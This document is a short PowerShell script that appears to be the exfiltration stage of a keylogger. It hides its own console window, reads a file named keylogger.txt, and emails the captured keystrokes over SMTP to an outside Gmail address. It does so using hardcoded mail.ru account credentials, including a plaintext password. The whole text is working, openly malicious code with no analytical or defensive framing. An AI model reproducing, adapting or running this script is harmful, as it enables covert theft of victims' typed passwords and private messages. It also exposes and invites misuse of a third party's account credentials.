$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
$Myemail="alena.petroshevich@mail.ru"
$Mypass="uTdUXdnR3sNxwQyAANcv"
$SMTP="smtp.mail.ru"
$To="urina.linforyt@gmail.com"
$Subject="KEYLOGGER"
$Body=Get-Content -Path keylogger.txt -Raw
$SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force
$MyCredentials=New-object System.Management.Automation.PSCredential $Myemail,$SecurePassword
Send-MailMessage -To $To -From $Myemail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $MyCredentials -UseSSL -Port 587 -DeliveryNotificationOption never